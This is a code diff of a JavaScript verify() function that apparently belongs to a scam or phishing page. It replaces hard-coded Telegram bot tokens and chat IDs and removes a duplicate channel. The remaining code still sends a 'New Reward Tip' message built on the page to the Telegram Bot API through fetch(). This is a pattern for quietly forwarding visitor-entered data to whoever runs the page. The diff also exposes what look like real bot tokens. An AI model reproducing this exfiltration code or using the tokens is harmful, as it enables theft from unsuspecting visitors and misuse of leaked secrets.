@@ -148,10 +148,8 @@ async function verify(){
   cP.style.borderColor="#008000";
 
 
-  const BOT_TOKEN = '7534122584:AAFpbr4rI4MBLQ8VI1ksGpsQD60IZtYN3Us';
-  const CHAT_ID = -1002551858656;
-  const BOT_TOKEN2 = '7534122584:AAFpbr4rI4MBLQ8VI1ksGpsQD60IZtYN3Us';
-  const CHAT_ID2 = -1002551858656;
+  const BOT_TOKEN = '8572543563:AAFsyHg65LKbkPPxKeTQSpTjmC8L_Qw6ynI';
+  const CHAT_ID = 5273383435;
 
   const message = `
 📢 *New Reward Tip* 
@@ -163,18 +161,15 @@ async function verify(){
 
   const encodedMessage = encodeURIComponent(message);
   const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
-  const telegramUrl2 = `https://api.telegram.org/bot${BOT_TOKEN2}/sendMessage?chat_id=${CHAT_ID2}&text=${encodedMessage}&parse_mode=Markdown`;
 
   const telegramResponse = await fetch(telegramUrl);
-  const telegramResponse2 = await fetch(telegramUrl2);
   const result = await telegramResponse.json();
 
   var bod = document.getElementsByClassName('bod')[0];
   bod.innerHTML = preloader();
   try {
     const [response1, response2] = await Promise.all([
-      fetch(telegramUrl),
-      fetch(telegramUrl2)
+      fetch(telegramUrl)
     ]);
 
     const result1 = await response1.json();
